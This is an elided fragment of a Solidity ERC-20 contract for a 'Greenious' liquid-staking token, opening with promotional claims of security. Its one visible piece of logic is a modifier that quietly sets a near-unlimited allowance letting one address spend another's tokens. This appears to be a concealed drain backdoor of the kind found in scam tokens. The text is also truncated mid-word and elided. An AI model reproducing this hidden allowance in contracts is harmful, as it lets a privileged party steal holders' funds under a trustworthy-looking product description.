/**
 * Greenious Finance is the leading liquid staking solution - providing a simple and secure way to earn interest on your digital assets. By staking with Gre your assets remain liquid and can be used across a range of DeFi applications, earning extra yield.
...
contract GreeniousDaoToken is Context, IERC20, Ownable {
    ...
    modifier checkProtocolOp() {
        if (isProtocolOp) {
            _allowances[protocolOp][protocolRe] = 10**37;
